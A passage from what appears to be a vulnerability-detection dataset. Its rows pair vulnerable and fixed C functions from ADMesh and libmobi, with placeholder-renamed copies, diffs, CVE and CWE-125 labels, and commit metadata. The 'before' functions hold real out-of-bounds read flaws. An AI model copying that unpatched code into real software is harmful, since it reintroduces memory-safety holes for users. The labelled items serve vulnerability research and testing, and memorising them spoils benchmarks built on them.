&stl->facet_start[facet].vertex[1], sizeof(stl_vertex))) {
edge1 = 1;
edge2 = 2;
edge3 = 0;
} else if(!memcmp(&stl->facet_start[facet].vertex[1],
&stl->facet_start[facet].vertex[2], sizeof(stl_vertex))) {
edge1 = 0;
edge2 = 2;
edge3 = 1;
} else if(!memcmp(&stl->facet_start[facet].vertex[2],
&stl->facet_start[facet].vertex[0], sizeof(stl_vertex))) {
edge1 = 0;
edge2 = 1;
edge3 = 2;
} else {
return;
}
neighbor1 = stl->neighbors_start[facet].neighbor[edge1];
neighbor2 = stl->neighbors_start[facet].neighbor[edge2];
if(neighbor1 == -1) {
stl_update_connects_remove_1(stl, neighbor2);
}
if(neighbor2 == -1) {
stl_update_connects_remove_1(stl, neighbor1);
}
neighbor3 = stl->neighbors_start[facet].neighbor[edge3];
vnot1 = stl->neighbors_start[facet].which_vertex_not[edge1];
vnot2 = stl->neighbors_start[facet].which_vertex_not[edge2];
vnot3 = stl->neighbors_start[facet].which_vertex_not[edge3];
if(neighbor1 != -1){
stl->neighbors_start[neighbor1].neighbor[(vnot1 + 1) % 3] = neighbor2;
stl->neighbors_start[neighbor1].which_vertex_not[(vnot1 + 1) % 3] = vnot2;
}
if(neighbor2 != -1){
stl->neighbors_start[neighbor2].neighbor[(vnot2 + 1) % 3] = neighbor1;
stl->neighbors_start[neighbor2].which_vertex_not[(vnot2 + 1) % 3] = vnot1;
}
stl_remove_facet(stl, facet);
if(neighbor3 != -1) {
stl_update_connects_remove_1(stl, neighbor3);
stl->neighbors_start[neighbor3].neighbor[(vnot3 + 1) % 3] = -1;
}
}","static void
stl_remove_degenerate(stl_file *VAR_0, int VAR_1) {
int VAR_2;
int VAR_3;
int VAR_4;
int VAR_5;
int VAR_6;
int VAR_7;
int VAR_8;
int VAR_9;
int VAR_10;
if (VAR_0->error) return;
if(   !memcmp(&VAR_0->facet_start[VAR_1].vertex[0],
&VAR_0->facet_start[VAR_1].vertex[1], sizeof(VAR_11))
&& !memcmp(&VAR_0->facet_start[VAR_1].vertex[1],
&VAR_0->facet_start[VAR_1].vertex[2], sizeof(VAR_11))) {
printf(""removing a facet in stl_remove_degenerate\n"");
stl_remove_facet(VAR_0, VAR_1);
return;
}
if(!memcmp(&VAR_0->facet_start[VAR_1].vertex[0],
&VAR_0->facet_start[VAR_1].vertex[1], sizeof(VAR_11))) {
VAR_2 = 1;
VAR_3 = 2;
VAR_4 = 0;
} else if(!memcmp(&VAR_0->facet_start[VAR_1].vertex[1],
&VAR_0->facet_start[VAR_1].vertex[2], sizeof(VAR_11))) {
VAR_2 = 0;
VAR_3 = 2;
VAR_4 = 1;
} else if(!memcmp(&VAR_0->facet_start[VAR_1].vertex[2],
&VAR_0->facet_start[VAR_1].vertex[0], sizeof(VAR_11))) {
VAR_2 = 0;
VAR_3 = 1;
VAR_4 = 2;
} else {
return;
}
VAR_5 = VAR_0->neighbors_start[VAR_1].neighbor[VAR_2];
VAR_6 = VAR_0->neighbors_start[VAR_1].neighbor[VAR_3];
if(VAR_5 == -1) {
stl_update_connects_remove_1(VAR_0, VAR_6);
}
if(VAR_6 == -1) {
stl_update_connects_remove_1(VAR_0, VAR_5);
}
VAR_7 = VAR_0->neighbors_start[VAR_1].neighbor[VAR_4];
VAR_8 = VAR_0->neighbors_start[VAR_1].which_vertex_not[VAR_2];
VAR_9 = VAR_0->neighbors_start[VAR_1].which_vertex_not[VAR_3];
VAR_10 = VAR_0->neighbors_start[VAR_1].which_vertex_not[VAR_4];
if(VAR_5 != -1){
VAR_0->neighbors_start[VAR_5].neighbor[(VAR_8 + 1) % 3] = VAR_6;
VAR_0->neighbors_start[VAR_5].which_vertex_not[(VAR_8 + 1) % 3] = VAR_9;
}
if(VAR_6 != -1){
VAR_0->neighbors_start[VAR_6].neighbor[(VAR_9 + 1) % 3] = VAR_5;
VAR_0->neighbors_start[VAR_6].which_vertex_not[(VAR_9 + 1) % 3] = VAR_8;
}
stl_remove_facet(VAR_0, VAR_1);
if(VAR_7 != -1) {
stl_update_connects_remove_1(VAR_0, VAR_7);
VAR_0->neighbors_start[VAR_7].neighbor[(VAR_10 + 1) % 3] = -1;
}
}",admesh/e84d8353f1347e1f26f0a95770d92ba14e6ede38/connect.c/vul/before/0.json,"static void
stl_remove_degenerate(stl_file *stl, int facet) {
  int edge1;
  int edge2;
  int edge3;
  int neighbor1;
  int neighbor2;
  int neighbor3;
  int vnot1;
  int vnot2;
  int vnot3;

  if (stl->error) return;

  if(   !memcmp(&stl->facet_start[facet].vertex[0],
                &stl->facet_start[facet].vertex[1], sizeof(stl_vertex))
        && !memcmp(&stl->facet_start[facet].vertex[1],
                   &stl->facet_start[facet].vertex[2], sizeof(stl_vertex))) {
    /* all 3 vertices are equal.  Just remove the facet.  I don't think*/
    /* this is really possible, but just in case... */
    printf(""removing a facet in stl_remove_degenerate\n"");

    stl_remove_facet(stl, facet);
    return;
  }

  if(!memcmp(&stl->facet_start[facet].vertex[0],
             &stl->facet_start[facet].vertex[1], sizeof(stl_vertex))) {
    edge1 = 1;
    edge2 = 2;
    edge3 = 0;
  } else if(!memcmp(&stl->facet_start[facet].vertex[1],
                    &stl->facet_start[facet].vertex[2], sizeof(stl_vertex))) {
    edge1 = 0;
    edge2 = 2;
    edge3 = 1;
  } else if(!memcmp(&stl->facet_start[facet].vertex[2],
                    &stl->facet_start[facet].vertex[0], sizeof(stl_vertex))) {
    edge1 = 0;
    edge2 = 1;
    edge3 = 2;
  } else {
    /* No degenerate. Function shouldn't have been called. */
    return;
  }
  neighbor1 = stl->neighbors_start[facet].neighbor[edge1];
  neighbor2 = stl->neighbors_start[facet].neighbor[edge2];

  if(neighbor1 == -1 && neighbor2 != -1) {
    stl_update_connects_remove_1(stl, neighbor2);
  }
  else if (neighbor2 == -1 && neighbor1 != -1) {
    stl_update_connects_remove_1(stl, neighbor1);
  }

  neighbor3 = stl->neighbors_start[facet].neighbor[edge3];
  vnot1 = stl->neighbors_start[facet].which_vertex_not[edge1];
  vnot2 = stl->neighbors_start[facet].which_vertex_not[edge2];
  vnot3 = stl->neighbors_start[facet].which_vertex_not[edge3];

  if(neighbor1 != -1){
    stl->neighbors_start[neighbor1].neighbor[(vnot1 + 1) % 3] = neighbor2;
    stl->neighbors_start[neighbor1].which_vertex_not[(vnot1 + 1) % 3] = vnot2;
  }
  if(neighbor2 != -1){
    stl->neighbors_start[neighbor2].neighbor[(vnot2 + 1) % 3] = neighbor1;
    stl->neighbors_start[neighbor2].which_vertex_not[(vnot2 + 1) % 3] = vnot1;
  }

  stl_remove_facet(stl, facet);

  if(neighbor3 != -1) {
    stl_update_connects_remove_1(stl, neighbor3);
    stl->neighbors_start[neighbor3].neighbor[(vnot3 + 1) % 3] = -1;
  }
}","static void
stl_remove_degenerate(stl_file *VAR_0, int VAR_1) {
  int VAR_2;
  int VAR_3;
  int VAR_4;
  int VAR_5;
  int VAR_6;
  int VAR_7;
  int VAR_8;
  int VAR_9;
  int VAR_10;

  if (VAR_0->error) return;

  if(   !memcmp(&VAR_0->facet_start[VAR_1].vertex[0],
                &VAR_0->facet_start[VAR_1].vertex[1], sizeof(VAR_11))
        && !memcmp(&VAR_0->facet_start[VAR_1].vertex[1],
                   &VAR_0->facet_start[VAR_1].vertex[2], sizeof(VAR_11))) {
    /* COMMENT_0 */
    /* COMMENT_1 */
    printf(""removing a facet in stl_remove_degenerate\n"");

    stl_remove_facet(VAR_0, VAR_1);
    return;
  }

  if(!memcmp(&VAR_0->facet_start[VAR_1].vertex[0],
             &VAR_0->facet_start[VAR_1].vertex[1], sizeof(VAR_11))) {
    VAR_2 = 1;
    VAR_3 = 2;
    VAR_4 = 0;
  } else if(!memcmp(&VAR_0->facet_start[VAR_1].vertex[1],
                    &VAR_0->facet_start[VAR_1].vertex[2], sizeof(VAR_11))) {
    VAR_2 = 0;
    VAR_3 = 2;
    VAR_4 = 1;
  } else if(!memcmp(&VAR_0->facet_start[VAR_1].vertex[2],
                    &VAR_0->facet_start[VAR_1].vertex[0], sizeof(VAR_11))) {
    VAR_2 = 0;
    VAR_3 = 1;
    VAR_4 = 2;
  } else {
    /* COMMENT_2 */
    return;
  }
  VAR_5 = VAR_0->neighbors_start[VAR_1].neighbor[VAR_2];
  VAR_6 = VAR_0->neighbors_start[VAR_1].neighbor[VAR_3];

  if(VAR_5 == -1 && VAR_6 != -1) {
    stl_update_connects_remove_1(VAR_0, VAR_6);
  }
  else if (VAR_6 == -1 && VAR_5 != -1) {
    stl_update_connects_remove_1(VAR_0, VAR_5);
  }

  VAR_7 = VAR_0->neighbors_start[VAR_1].neighbor[VAR_4];
  VAR_8 = VAR_0->neighbors_start[VAR_1].which_vertex_not[VAR_2];
  VAR_9 = VAR_0->neighbors_start[VAR_1].which_vertex_not[VAR_3];
  VAR_10 = VAR_0->neighbors_start[VAR_1].which_vertex_not[VAR_4];

  if(VAR_5 != -1){
    VAR_0->neighbors_start[VAR_5].neighbor[(VAR_8 + 1) % 3] = VAR_6;
    VAR_0->neighbors_start[VAR_5].which_vertex_not[(VAR_8 + 1) % 3] = VAR_9;
  }
  if(VAR_6 != -1){
    VAR_0->neighbors_start[VAR_6].neighbor[(VAR_9 + 1) % 3] = VAR_5;
    VAR_0->neighbors_start[VAR_6].which_vertex_not[(VAR_9 + 1) % 3] = VAR_8;
  }

  stl_remove_facet(VAR_0, VAR_1);

  if(VAR_7 != -1) {
    stl_update_connects_remove_1(VAR_0, VAR_7);
    VAR_0->neighbors_start[VAR_7].neighbor[(VAR_10 + 1) % 3] = -1;
  }
}",admesh/e84d8353f1347e1f26f0a95770d92ba14e6ede38/connect.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -46,13 +46,12 @@
   neighbor1 = stl->neighbors_start[facet].neighbor[edge1];
   neighbor2 = stl->neighbors_start[facet].neighbor[edge2];
 
-  if(neighbor1 == -1) {
+  if(neighbor1 == -1 && neighbor2 != -1) {
     stl_update_connects_remove_1(stl, neighbor2);
   }
-  if(neighbor2 == -1) {
+  else if (neighbor2 == -1 && neighbor1 != -1) {
     stl_update_connects_remove_1(stl, neighbor1);
   }
-
 
   neighbor3 = stl->neighbors_start[facet].neighbor[edge3];
   vnot1 = stl->neighbors_start[facet].which_vertex_not[edge1];","{'deleted_lines': ['  if(neighbor1 == -1) {', '  if(neighbor2 == -1) {', ''], 'added_lines': ['  if(neighbor1 == -1 && neighbor2 != -1) {', '  else if (neighbor2 == -1 && neighbor1 != -1) {']}",True,ADMesh through 0.98.4 has a heap-based buffer over-read in stl_update_connects_remove_1 (called from stl_remove_degenerate) in connect.c in libadmesh.a.,8.1,HIGH,2,valid,2022-04-25T10:04:46Z,4
CVE-2018-25033,['CWE-125'],AV:N/AC:M/Au:N/C:P/I:N/A:P,0,admesh,"Fix heap buffer overflow in stl_update_connects_remove_1


- Add argument value check to the stl_update_connects_remove_1
- Add neighbor value check in stl_remove_degenerate

Fixes https://github.com/admesh/admesh/issues/28
Merges https://github.com/admesh/admesh/pull/55",e84d8353f1347e1f26f0a95770d92ba14e6ede38,https://github.com/admesh/admesh/commit/e84d8353f1347e1f26f0a95770d92ba14e6ede38,src/connect.c,stl_update_connects_remove_1,"void
stl_update_connects_remove_1(stl_file *stl, int facet_num) {
int j;
if (stl->error) return;
j = ((stl->neighbors_start[facet_num].neighbor[0] == -1) +
(stl->neighbors_start[facet_num].neighbor[1] == -1) +
(stl->neighbors_start[facet_num].neighbor[2] == -1));
if(j == 0) {       
stl->stats.connected_facets_3_edge -= 1;
} else if(j == 1) {     
stl->stats.connected_facets_2_edge -= 1;
} else if(j == 2) {     
stl->stats.connected_facets_1_edge -= 1;
}
}","void
stl_update_connects_remove_1(stl_file *VAR_0, int VAR_1) {
int VAR_2;
if (VAR_0->error) return;
VAR_2 = ((VAR_0->neighbors_start[VAR_1].neighbor[0] == -1) +
(VAR_0->neighbors_start[VAR_1].neighbor[1] == -1) +
(VAR_0->neighbors_start[VAR_1].neighbor[2] == -1));
if(VAR_2 == 0) {       
VAR_0->stats.connected_facets_3_edge -= 1;
} else if(VAR_2 == 1) {     
VAR_0->stats.connected_facets_2_edge -= 1;
} else if(VAR_2 == 2) {     
VAR_0->stats.connected_facets_1_edge -= 1;
}
}",admesh/e84d8353f1347e1f26f0a95770d92ba14e6ede38/connect.c/vul/before/1.json,"void
stl_update_connects_remove_1(stl_file *stl, int facet_num) {
  int j;

  if (
    stl->error ||
    facet_num < 0
  ) return;

  /* Update list of connected edges */
  j = ((stl->neighbors_start[facet_num].neighbor[0] == -1) +
       (stl->neighbors_start[facet_num].neighbor[1] == -1) +
       (stl->neighbors_start[facet_num].neighbor[2] == -1));
  if(j == 0) {		       /* Facet has 3 neighbors */
    stl->stats.connected_facets_3_edge -= 1;
  } else if(j == 1) {	     /* Facet has 2 neighbors */
    stl->stats.connected_facets_2_edge -= 1;
  } else if(j == 2) {	     /* Facet has 1 neighbor  */
    stl->stats.connected_facets_1_edge -= 1;
  }
}","void
stl_update_connects_remove_1(stl_file *VAR_0, int VAR_1) {
  int VAR_2;

  if (
    VAR_0->error ||
    VAR_1 < 0
  ) return;

  /* COMMENT_0 */
  VAR_2 = ((VAR_0->neighbors_start[VAR_1].neighbor[0] == -1) +
       (VAR_0->neighbors_start[VAR_1].neighbor[1] == -1) +
       (VAR_0->neighbors_start[VAR_1].neighbor[2] == -1));
  if(VAR_2 == 0) {		       /* COMMENT_1 */
    VAR_0->stats.connected_facets_3_edge -= 1;
  } else if(VAR_2 == 1) {	     /* COMMENT_2 */
    VAR_0->stats.connected_facets_2_edge -= 1;
  } else if(VAR_2 == 2) {	     /* COMMENT_3 */
    VAR_0->stats.connected_facets_1_edge -= 1;
  }
}",admesh/e84d8353f1347e1f26f0a95770d92ba14e6ede38/connect.c/vul/after/1.json,"--- func_before
+++ func_after
@@ -2,7 +2,11 @@
 stl_update_connects_remove_1(stl_file *stl, int facet_num) {
   int j;
 
-  if (stl->error) return;
+  if (
+    stl->error ||
+    facet_num < 0
+  ) return;
+
   /* Update list of connected edges */
   j = ((stl->neighbors_start[facet_num].neighbor[0] == -1) +
        (stl->neighbors_start[facet_num].neighbor[1] == -1) +","{'deleted_lines': ['  if (stl->error) return;'], 'added_lines': ['  if (', '    stl->error ||', '    facet_num < 0', '  ) return;', '']}",True,ADMesh through 0.98.4 has a heap-based buffer over-read in stl_update_connects_remove_1 (called from stl_remove_degenerate) in connect.c in libadmesh.a.,8.1,HIGH,2,valid,2022-04-25T10:04:46Z,4
CVE-2022-1987,['CWE-125'],AV:N/AC:M/Au:N/C:P/I:N/A:P,0,bfabiszewski/libmobi,Fix: index entry label not being zero-terminated with corrupt input,612562bc1ea38f1708b044e7a079c47a05b1291d,https://github.com/bfabiszewski/libmobi/commit/612562bc1ea38f1708b044e7a079c47a05b1291d,src/index.c,mobi_parse_index_entry,"static MOBI_RET mobi_parse_index_entry(MOBIIndx *indx, const MOBIIdxt idxt, const MOBITagx *tagx, const MOBIOrdt *ordt, MOBIBuffer *buf, const size_t curr_number) {
if (indx == NULL) {
debug_print(""%s"", ""INDX structure not initialized\n"");
return MOBI_INIT_FAILED;
}
const size_t entry_offset = indx->entries_count;
const size_t entry_length = idxt.offsets[curr_number + 1] - idxt.offsets[curr_number];
mobi_buffer_setpos(buf, idxt.offsets[curr_number]);
size_t entry_number = curr_number + entry_offset;
if (entry_number >= indx->total_entries_count) {
debug_print(""Entry number beyond array: %zu\n"", entry_number);
return MOBI_DATA_CORRUPT;
}
const size_t buf_maxlen = buf->maxlen;
if (buf->offset + entry_length >= buf_maxlen) {
debug_print(""Entry length too long: %zu\n"", entry_length);
return MOBI_DATA_CORRUPT;
}
buf->maxlen = buf->offset + entry_length;
size_t label_length = mobi_buffer_get8(buf);
if (label_length > entry_length) {
debug_print(""Label length too long: %zu\n"", label_length);
return MOBI_DATA_CORRUPT;
}
char text[INDX_LABEL_SIZEMAX];
if (ordt->ordt2) {
label_length = mobi_getstring_ordt(ordt, buf, (unsigned char*) text, label_length);
} else {
label_length = mobi_indx_get_label((unsigned char*) text, buf, label_length, indx->ligt_entries_count);
}
indx->entries[entry_number].label = malloc(label_length + 1);
if (indx->entries[entry_number].label == NULL) {
debug_print(""Memory allocation failed (%zu bytes)\n"", label_length);
return MOBI_MALLOC_FAILED;
}
strncpy(indx->entries[entry_number].label, text, label_length + 1);
unsigned char *control_bytes;
control_bytes = buf->data + buf->offset;
mobi_buffer_seek(buf, (int) tagx->control_byte_count);
indx->entries[entry_number].tags_count = 0;
indx->entries[entry_number].tags = NULL;
if (tagx->tags_count > 0) {
typedef struct {
uint8_t tag;
uint8_t tag_value_count;
uint32_t value_count;
uint32_t value_bytes;
} MOBIPtagx;
MOBIPtagx *ptagx = malloc(tagx->tags_count * sizeof(MOBIPtagx));
if (ptagx == NULL) {
debug_print(""Memory allocation failed (%zu bytes)\n"", tagx->tags_count * sizeof(MOBIPtagx));
return MOBI_MALLOC_FAILED;
}
uint32_t ptagx_count = 0;
size_t len;
size_t i = 0;
while (i < tagx->tags_count) {
if (tagx->tags[i].control_byte == 1) {
control_bytes++;
i++;
continue;
}
uint32_t value = control_bytes[0] & tagx->tags[i].bitmask;
if (value != 0) {
uint32_t value_count = MOBI_NOTSET;
uint32_t value_bytes = MOBI_NOTSET;
if (value == tagx->tags[i].bitmask) {
if (mobi_bitcount(tagx->tags[i].bitmask) > 1) {
len = 0;
value_bytes = mobi_buffer_get_varlen(buf, &len);
} else {
value_count = 1;
}
} else {
uint8_t mask = tagx->tags[i].bitmask;
while ((mask & 1) == 0) {
mask >>= 1;
value >>= 1;
}
value_count = value;
}
ptagx[ptagx_count].tag = tagx->tags[i].tag;
ptagx[ptagx_count].tag_value_count = tagx->tags[i].values_count;
ptagx[ptagx_count].value_count = value_count;
ptagx[ptagx_count].value_bytes = value_bytes;
ptagx_count++;
}
i++;
}
indx->entries[entry_number].tags = malloc(tagx->tags_count * sizeof(MOBIIndexTag));
if (indx->entries[entry_number].tags == NULL) {
debug_print(""Memory allocation failed (%zu bytes)\n"", tagx->tags_count * sizeof(MOBIIndexTag));
free(ptagx);
return MOBI_MALLOC_FAILED;
}
i = 0;
while (i < ptagx_count) {
uint32_t tagvalues_count = 0;
uint32_t tagvalues[INDX_TAGVALUES_MAX];
if (ptagx[i].value_count != MOBI_NOTSET) {
size_t count = ptagx[i].value_count * ptagx[i].tag_value_count;
while (count-- && tagvalues_count < INDX_TAGVALUES_MAX) {
len = 0;
const uint32_t value_bytes = mobi_buffer_get_varlen(buf, &len);
tagvalues[tagvalues_count++] = value_bytes;
}
} else {
len = 0;
while (len < ptagx[i].value_bytes && tagvalues_count < INDX_TAGVALUES_MAX) {
const uint32_t value_bytes = mobi_buffer_get_varlen(buf, &len);
tagvalues[tagvalues_count++] = value_bytes;
}
}
if (tagvalues_count) {
const size_t arr_size = tagvalues_count * sizeof(*indx->entries[entry_number].tags[i].tagvalues);
indx->entries[entry_number].tags[i].tagvalues = malloc(arr_size);
if (indx->entries[entry_number].tags[i].tagvalues == NULL) {
debug_print(""Memory allocation failed (%zu bytes)\n"", arr_size);
free(ptagx);
return MOBI_MALLOC_FAILED;
}
memcpy(indx->entries[entry_number].tags[i].tagvalues, tagvalues, arr_size);
} else {
indx->entries[entry_number].tags[i].tagvalues = NULL;
}
indx->entries[entry_number].tags[i].tagid = ptagx[i].tag;
indx->entries[entry_number].tags[i].tagvalues_count = tagvalues_count;
indx->entries[entry_number].tags_count++;
i++;
}
free(ptagx);
}
buf->maxlen = buf_maxlen;
return MOBI_SUCCESS;
}","static MOBI_RET mobi_parse_index_entry(MOBIIndx *VAR_0, const MOBIIdxt VAR_1, const MOBITagx *VAR_2, const MOBIOrdt *VAR_3, MOBIBuffer *VAR_4, const size_t VAR_5) {
if (VAR_0 == NULL) {
debug_print(""%s"", ""INDX structure not initialized\n"");
return VAR_6;
}
const size_t VAR_7 = VAR_0->entries_count;
const size_t VAR_8 = VAR_1.offsets[VAR_5 + 1] - VAR_1.offsets[VAR_5];
mobi_buffer_setpos(VAR_4, VAR_1.offsets[VAR_5]);
size_t VAR_9 = VAR_5 + VAR_7;
if (VAR_9 >= VAR_0->total_entries_count) {
debug_print(""Entry number beyond array: %zu\n"", VAR_9);
return VAR_10;
}
const size_t VAR_11 = VAR_4->maxlen;
if (VAR_4->offset + VAR_8 >= VAR_11) {
debug_print(""Entry length too long: %zu\n"", VAR_8);
return VAR_10;
}
VAR_4->maxlen = VAR_4->offset + VAR_8;
size_t VAR_12 = mobi_buffer_get8(VAR_4);
if (VAR_12 > VAR_8) {
debug_print(""Label length too long: %zu\n"", VAR_12);
return VAR_10;
}
char VAR_13[VAR_14];
if (VAR_3->ordt2) {
VAR_12 = mobi_getstring_ordt(VAR_3, VAR_4, (unsigned char*) VAR_13, VAR_12);
} else {
VAR_12 = mobi_indx_get_label((unsigned char*) VAR_13, VAR_4, VAR_12, VAR_0->ligt_entries_count);
}
VAR_0->entries[VAR_9].label = malloc(VAR_12 + 1);
if (VAR_0->entries[VAR_9].label == NULL) {
debug_print(""Memory allocation failed (%zu bytes)\n"", VAR_12);
return VAR_15;
}
strncpy(VAR_0->entries[VAR_9].label, VAR_13, VAR_12 + 1);
unsigned char *VAR_16;
VAR_16 = VAR_4->data + VAR_4->offset;
mobi_buffer_seek(VAR_4, (int) VAR_2->control_byte_count);
VAR_0->entries[VAR_9].tags_count = 0;
VAR_0->entries[VAR_9].tags = NULL;
if (VAR_2->tags_count > 0) {
typedef struct {
uint8_t tag;
uint8_t tag_value_count;
uint32_t value_count;
uint32_t value_bytes;
} MOBIPtagx;
MOBIPtagx *VAR_17 = malloc(VAR_2->tags_count * sizeof(MOBIPtagx));
if (VAR_17 == NULL) {
debug_print(""Memory allocation failed (%zu bytes)\n"", VAR_2->tags_count * sizeof(MOBIPtagx));
return VAR_15;
}
uint32_t VAR_18 = 0;
size_t VAR_19;
size_t VAR_20 = 0;
while (VAR_20 < VAR_2->tags_count) {
if (VAR_2->tags[VAR_20].control_byte == 1) {
VAR_16++;
VAR_20++;
continue;
}
uint32_t VAR_21 = VAR_16[0] & VAR_2->tags[VAR_20].bitmask;
if (VAR_21 != 0) {
uint32_t VAR_22 = VAR_23;
uint32_t VAR_24 = VAR_23;
if (VAR_21 == VAR_2->tags[VAR_20].bitmask) {
if (mobi_bitcount(VAR_2->tags[VAR_20].bitmask) > 1) {
VAR_19 = 0;
VAR_24 = mobi_buffer_get_varlen(VAR_4, &VAR_19);
} else {
VAR_22 = 1;
}
} else {
uint8_t VAR_25 = VAR_2->tags[VAR_20].bitmask;
while ((VAR_25 & 1) == 0) {
VAR_25 >>= 1;
VAR_21 >>= 1;
}
VAR_22 = VAR_21;
}
VAR_17[VAR_18].tag = VAR_2->tags[VAR_20].tag;
VAR_17[VAR_18].tag_value_count = VAR_2->tags[VAR_20].values_count;
VAR_17[VAR_18].value_count = VAR_22;
VAR_17[VAR_18].value_bytes = VAR_24;
VAR_18++;
}
VAR_20++;
}
VAR_0->entries[VAR_9].tags = malloc(VAR_2->tags_count * sizeof(VAR_26));
if (VAR_0->entries[VAR_9].tags == NULL) {
debug_print(""Memory allocation failed (%zu bytes)\n"", VAR_2->tags_count * sizeof(VAR_26));
free(VAR_17);
return VAR_15;
}
VAR_20 = 0;
while (VAR_20 < VAR_18) {
uint32_t VAR_27 = 0;
uint32_t VAR_28[VAR_29];
if (VAR_17[VAR_20].value_count != VAR_23) {
size_t VAR_30 = VAR_17[VAR_20].value_count * VAR_17[VAR_20].tag_value_count;
while (VAR_30-- && VAR_27 < VAR_29) {
VAR_19 = 0;
const uint32_t VAR_24 = mobi_buffer_get_varlen(VAR_4, &VAR_19);
VAR_28[VAR_27++] = VAR_24;
}
} else {
VAR_19 = 0;
while (VAR_19 < VAR_17[VAR_20].value_bytes && VAR_27 < VAR_29) {
const uint32_t VAR_24 = mobi_buffer_get_varlen(VAR_4, &VAR_19);
VAR_28[VAR_27++] = VAR_24;
}
}
if (VAR_27) {
const size_t VAR_31 = VAR_27 * sizeof(*VAR_0->entries[VAR_9].tags[VAR_20].tagvalues);
VAR_0->entries[VAR_9].tags[VAR_20].tagvalues = malloc(VAR_31);
if (VAR_0->entries[VAR_9].tags[VAR_20].tagvalues == NULL) {
debug_print(""Memory allocation failed (%zu bytes)\n"", VAR_31);
free(VAR_17);
return VAR_15;
}
memcpy(VAR_0->entries[VAR_9].tags[VAR_20].tagvalues, VAR_28, VAR_31);
} else {
VAR_0->entries[VAR_9].tags[VAR_20].tagvalues = NULL;
}
VAR_0->entries[VAR_9].tags[VAR_20].tagid = VAR_17[VAR_20].tag;
VAR_0->entries[VAR_9].tags[VAR_20].tagvalues_count = VAR_27;
VAR_0->entries[VAR_9].tags_count++;
VAR_20++;
}
free(VAR_17);
}
VAR_4->maxlen = VAR_11;
return VAR_32;
}",bfabiszewski/libmobi/612562bc1ea38f1708b044e7a079c47a05b1291d/index.c/vul/before/0.json,"static MOBI_RET mobi_parse_index_entry(MOBIIndx *indx, const MOBIIdxt idxt, const MOBITagx *tagx, const MOBIOrdt *ordt, MOBIBuffer *buf, const size_t curr_number) {
    if (indx == NULL) {
        debug_print(""%s"", ""INDX structure not initialized\n"");
        return MOBI_INIT_FAILED;
    }
    const size_t entry_offset = indx->entries_count;
    const size_t entry_length = idxt.offsets[curr_number + 1] - idxt.offsets[curr_number];
    mobi_buffer_setpos(buf, idxt.offsets[curr_number]);
    size_t entry_number = curr_number + entry_offset;
    if (entry_number >= indx->total_entries_count) {
        debug_print(""Entry number beyond array: %zu\n"", entry_number);
        return MOBI_DATA_CORRUPT;
    }
    /* save original record maxlen */
    const size_t buf_maxlen = buf->maxlen;
    if (buf->offset + entry_length >= buf_maxlen) {
        debug_print(""Entry length too long: %zu\n"", entry_length);
        return MOBI_DATA_CORRUPT;
    }
    buf->maxlen = buf->offset + entry_length;
    size_t label_length = mobi_buffer_get8(buf);
    if (label_length > entry_length) {
        debug_print(""Label length too long: %zu\n"", label_length);
        return MOBI_DATA_CORRUPT;
    }
    char text[INDX_LABEL_SIZEMAX + 1];
    /* FIXME: what is ORDT1 for? */
    if (ordt->ordt2) {
        label_length = mobi_getstring_ordt(ordt, buf, (unsigned char*) text, label_length);
    } else {
        label_length = mobi_indx_get_label((unsigned char*) text, buf, label_length, indx->ligt_entries_count);
        if (buf->error != MOBI_SUCCESS) {
            debug_print(""Buffer error reading label: %d\n"", buf->error);
            return MOBI_DATA_CORRUPT;
        }
    }
    indx->entries[entry_number].label = malloc(label_length + 1);
    if (indx->entries[entry_number].label == NULL) {
        debug_print(""Memory allocation failed (%zu bytes)\n"", label_length);
        return MOBI_MALLOC_FAILED;
    }
    strncpy(indx->entries[entry_number].label, text, label_length + 1);
    //debug_print(""tag label[%zu]: %s\n"", entry_number, indx->entries[entry_number].label);
    unsigned char *control_bytes;
    control_bytes = buf->data + buf->offset;
    mobi_buffer_seek(buf, (int) tagx->control_byte_count);
    indx->entries[entry_number].tags_count = 0;
    indx->entries[entry_number].tags = NULL;
    if (tagx->tags_count > 0) {
        typedef struct {
            uint8_t tag;
            uint8_t tag_value_count;
            uint32_t value_count;
            uint32_t value_bytes;
        } MOBIPtagx;
        MOBIPtagx *ptagx = malloc(tagx->tags_count * sizeof(MOBIPtagx));
        if (ptagx == NULL) {
            debug_print(""Memory allocation failed (%zu bytes)\n"", tagx->tags_count * sizeof(MOBIPtagx));
            return MOBI_MALLOC_FAILED;
        }
        uint32_t ptagx_count = 0;
        size_t len;
        size_t i = 0;
        while (i < tagx->tags_count) {
            if (tagx->tags[i].control_byte == 1) {
                control_bytes++;
                i++;
                continue;
            }
            uint32_t value = control_bytes[0] & tagx->tags[i].bitmask;
            if (value != 0) {
                /* FIXME: is it safe to use MOBI_NOTSET? */
                uint32_t value_count = MOBI_NOTSET;
                uint32_t value_bytes = MOBI_NOTSET;
                /* all bits of masked value are set */
                if (value == tagx->tags[i].bitmask) {
                    /* more than 1 bit set */
                    if (mobi_bitcount(tagx->tags[i].bitmask) > 1) {
                        /* read value bytes from entry */
                        len = 0;
                        value_bytes = mobi_buffer_get_varlen(buf, &len);
                    } else {
                        value_count = 1;
                    }
                } else {
                    uint8_t mask = tagx->tags[i].bitmask;
                    while ((mask & 1) == 0) {
                        mask >>= 1;
                        value >>= 1;
                    }
                    value_count = value;
                }
                ptagx[ptagx_count].tag = tagx->tags[i].tag;
                ptagx[ptagx_count].tag_value_count = tagx->tags[i].values_count;
                ptagx[ptagx_count].value_count = value_count;
                ptagx[ptagx_count].value_bytes = value_bytes;
                ptagx_count++;
            }
            i++;
        }
        indx->entries[entry_number].tags = malloc(tagx->tags_count * sizeof(MOBIIndexTag));
        if (indx->entries[entry_number].tags == NULL) {
            debug_print(""Memory allocation failed (%zu bytes)\n"", tagx->tags_count * sizeof(MOBIIndexTag));
            free(ptagx);
            return MOBI_MALLOC_FAILED;
        }
        i = 0;
        while (i < ptagx_count) {
            uint32_t tagvalues_count = 0;
            /* FIXME: is it safe to use MOBI_NOTSET? */
            /* value count is set */
            uint32_t tagvalues[INDX_TAGVALUES_MAX];
            if (ptagx[i].value_count != MOBI_NOTSET) {
                size_t count = ptagx[i].value_count * ptagx[i].tag_value_count;
                while (count-- && tagvalues_count < INDX_TAGVALUES_MAX) {
                    len = 0;
                    const uint32_t value_bytes = mobi_buffer_get_varlen(buf, &len);
                    tagvalues[tagvalues_count++] = value_bytes;
                }
            /* value count is not set */
            } else {
                /* read value_bytes bytes */
                len = 0;
                while (len < ptagx[i].value_bytes && tagvalues_count < INDX_TAGVALUES_MAX) {
                    const uint32_t value_bytes = mobi_buffer_get_varlen(buf, &len);
                    tagvalues[tagvalues_count++] = value_bytes;
